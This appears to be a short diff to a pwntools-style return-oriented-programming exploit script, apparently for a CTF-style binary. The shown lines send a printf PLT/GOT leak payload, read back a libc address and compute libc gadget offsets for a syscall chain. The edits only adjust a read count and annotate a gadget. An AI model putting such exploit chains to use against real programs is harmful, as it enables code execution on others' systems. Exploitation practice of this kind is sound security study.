@@ -46,7 +46,7 @@ exploit = padA + box + pop_rdi + printf_pltgot + printf_plt + ret + box
 #pause()
 p.clean()
 p.sendline(exploit)
-p.recvlines(3)
+p.recvlines(2)
 
 # libc functions
 leak = p.recvn(7).strip()
@@ -60,7 +60,7 @@ libc_pop_rax = libc_base + 0x45eb0
 libc_pop_rsi = libc_base + 0xda97d
 libc_pop_rdx = libc_base + 0x167ced # pop rdx; call qword ptr [rax + 0x20];
 libc_syscall = libc_base + 0x29db4
-libc_edx_syscall = libc_base + 0x147cdc
+libc_edx_syscall = libc_base + 0x147cdc # add edx, 1 ; syscall
 
 # confirmations
 print('libc_printf leak: ', hex(libc_printf))
